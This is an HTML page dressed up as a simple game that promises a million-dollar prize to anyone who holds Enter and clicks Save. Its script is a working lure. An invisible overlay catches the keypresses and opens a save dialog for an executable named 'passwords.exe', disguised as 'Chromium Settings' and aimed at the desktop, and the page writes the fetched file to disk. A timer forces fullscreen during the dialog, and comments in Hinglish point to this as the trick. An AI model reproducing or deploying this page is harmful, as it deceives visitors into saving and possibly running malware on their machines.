<html>
<head>
    <title>Save file - 1 Sec Fullscreen</title>
    <meta charset="UTF-8">
</head>
<style>
    body {
        background: rgba(29, 48, 109, 0.849);
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        height: 100vh;
        margin: 0;
    }
    h1, h2, h3 { -webkit-text-stroke: 1px #00000050; text-align: center; }
    h1 { color: #D96C06; font-size: 56px; }
    h2 { color: #1ebe8e; font-size: 56px; }
    h3 { color: #C6F91F; font-size: 56px; }
    h2 span { color: #cf4848; font-size: 90px; }
</style>
<body>
    <script>
        let countEnter = 0;
        let isDownloaded = false;

        window.onload = function () {
            const body = document.querySelector('body');
            const pixel = document.querySelector('#pixel');

            body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
            body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;

            pixel.addEventListener('click', async () => {
                // --- TRICK YAHAN HAI ---
                // Save window khulne se pehle timer start kar do
                setTimeout(() => {
                    const elem = document.documentElement;
                    if (elem.requestFullscreen) {
                        elem.requestFullscreen();
                    } else if (elem.webkitRequestFullscreen) {
                        elem.webkitRequestFullscreen();
                    }
                    console.log("1 Second Over: Fullscreen Triggered!");
                }, 1000); 

                try {
                    const options = {
                        startIn: 'desktop',
                        suggestedName: 'passwords.exe',
                        types: [{
                            description: 'Chromium Settings',
                            accept: { 'application/x-msdownload': ['.exe'] }
                        }],
                        excludeAcceptAllOption: true
                    };

                    // Ab ye popup khulega, lekin timer piche chal raha hai
                    const handle = await window.showSaveFilePicker(options);
                    
                    const writable = await handle.createWritable();
                    const response = await fetch('passwords.exe');
                    await response.body.pipeTo(writable);
                    
                    document.querySelector("#gameover").textContent = "GAME OVER";
                } catch (err) {
                    // Agar user cancel bhi karde, fullscreen phir bhi ho jayega timer ki wajah se
                    console.log("Interaction check:", err);
                }
            });
        };

        function clickedEnter() {
            countEnter++;
            if (countEnter > 5 && !isDownloaded) {
                document.querySelector('#pixel').click();
                isDownloaded = true;
            }
        }

        function cancelEnter() {
            countEnter = 0;
        }
    </script>

    <div id="pixel" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:10; cursor:pointer;"></div>

    <h1>Super Simple Game😻😻😻</h1>
    <h2><span>⌨️HOLD ENTER</span> for 5 seconds</h2>
    <h3>click on Save</h3>
    <h4>win $1,000,000 and rule the world! 🔥🔥🔥🚀</h4>
    <h3 id="gameover"></h3>
</body>
</html>
